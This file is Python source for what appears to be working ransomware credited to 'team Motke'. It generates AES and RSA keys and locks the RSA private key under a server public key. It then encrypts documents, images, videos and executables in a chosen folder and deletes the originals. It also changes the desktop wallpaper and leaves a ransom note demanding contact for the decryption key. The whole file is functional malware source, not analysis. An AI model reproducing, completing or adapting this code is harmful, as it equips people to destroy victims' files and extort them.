from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
import subprocess
import os
import ctypes
import shutil

def load_server_public():
    with open("server_public_key.pem", "rb") as key_file:
        server_public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
    return server_public_key


def generate_aes():
    key = Fernet.generate_key()
    f = Fernet(key)
    return f, key


def mal_generate_rsa():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key


def encrypt_chunks_rsa(data, key):
    encrypted = key.encrypt(
        data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted


def encrypt_mal_private(mal_private, server_public):
    private = mal_private.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    encrypted_private = b''
    for chunk in range(0, len(private), 150):
        enc_output = encrypt_chunks_rsa(private[chunk:chunk+150], server_public)
        encrypted_private += enc_output
    desktop_path = os.path.expanduser(r"~\Desktop")
    while True:
        try:
            with open(os.path.join(desktop_path, 'encrypted_private_rsa.motke'), 'wb') as file:
                shutil.copy('decryptor.py', os.path.join(desktop_path, 'decryptor.py'))
                file.write(encrypted_private)
                break
        except PermissionError:
            os.remove(os.path.join(desktop_path,'encrypted_private_rsa.motke'))
    subprocess.check_call(["attrib", "+H", os.path.join(desktop_path,'encrypted_private_rsa.motke')])


def create_txt():
    desktop_path = os.path.expanduser(r"~\Desktop")
    with open(desktop_path + r"\README_Motke.txt", 'w') as file:
        file.write(
            '''
            Your files were encrypted by team Motke, if you want to decrypt it, you must use the decryptor in this folder.
            DO NOT change any file, changing a file may lead to irreversible changes.
            Running the encryption more than once, WILL lead to irreversible changes.
            To receive the private key, send us an email at:
            <example@email.com>
        
            Team Motke.
            '''
        )


def encrypt_aes(aes_key, mal_public):
    encrypted = mal_public.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted


def encrypt_data_aes(data, key):
    output = key.encrypt(data)
    print(len(output))
    return output


def encrypt_file(file_name, key, enc_key):
    with open(file_name, 'rb') as file:
        file_data = file.read()

    os.remove(file_name)
    with open(file_name+'.motke', 'wb') as file:
        file.write(enc_key)
        for chunk in range(0, len(file_data), 9000000):
            file.write(encrypt_data_aes(file_data[chunk: chunk+9000000], key))


def change_wallpaper():
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, os.path.join(os.getcwd(),
                                                                                     'wallpaper.png'), 0)


def select_folder():
    while True:
        folder_path = input('Enter full folder path to encrypt:\n')
        if os.path.isdir(folder_path):
            return folder_path
        else:
            print('Folder does not exist or path passed is invalid.')


def scan_files_in_folder(path):
    all_files = os.listdir(path)
    ext_to_decrypt = ['docx', 'exe','txt', 'png', 'jpg', 'avi', 'bmp', 'mp4', 'mp3', 'mkv']
    files_to_encrypt = []
    for file in all_files:
        file_ext = file.split('.')[-1]
        if file_ext.lower() in ext_to_decrypt:
            files_to_encrypt.append(file)

    return files_to_encrypt


def main():
    server_public_key = load_server_public()
    aes, key = generate_aes()
    private, public = mal_generate_rsa()
    encrypt_mal_private(private, server_public_key)
    encrypted_aes = encrypt_aes(key, public)
    folder_path = select_folder()
    files = scan_files_in_folder(folder_path)
    for file in files:
        file = os.path.join(folder_path, file)
        if file != os.path.join(folder_path, 'wallpaper.png'):
            encrypt_file(file, aes, encrypted_aes)

    change_wallpaper()
    create_txt()


if __name__ == '__main__':
    main()
